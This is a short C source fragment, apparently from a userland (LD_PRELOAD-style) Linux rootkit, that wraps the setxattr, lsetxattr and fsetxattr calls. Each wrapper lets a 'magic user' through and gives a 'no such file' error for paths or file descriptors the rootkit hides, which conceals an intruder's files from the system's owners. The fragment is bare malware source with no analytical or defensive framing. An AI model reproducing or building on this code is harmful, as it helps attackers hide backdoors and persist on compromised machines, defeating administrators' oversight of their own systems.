int setxattr(const char *path, const char *name, const void *value, size_t size, int flags){
    hook(CSETXATTR);
    if(magicusr()) return (long)call(CSETXATTR, path, name, value, size, flags);
    if(hidden_path(path)) { errno = ENOENT; return -1; }
    return (long)call(CSETXATTR, path, name, value, size, flags);
}

int lsetxattr(const char *path, const char *name, const void *value, size_t size, int flags){
    hook(CLSETXATTR);
    if(magicusr()) return (long)call(CLSETXATTR, path, name, value, size, flags);
    if(hidden_path(path)) { errno = ENOENT; return -1; }
    return (long)call(CLSETXATTR, path, name, value, size, flags);
}

int fsetxattr(int fd, const char *name, const void *value, size_t size, int flags){
    hook(CFSETXATTR);
    if(magicusr()) return (long)call(CFSETXATTR, fd, name, value, size, flags);
    if(hidden_fd(fd)) { errno = ENOENT; return -1; }
    return (long)call(CFSETXATTR, fd, name, value, size, flags);
}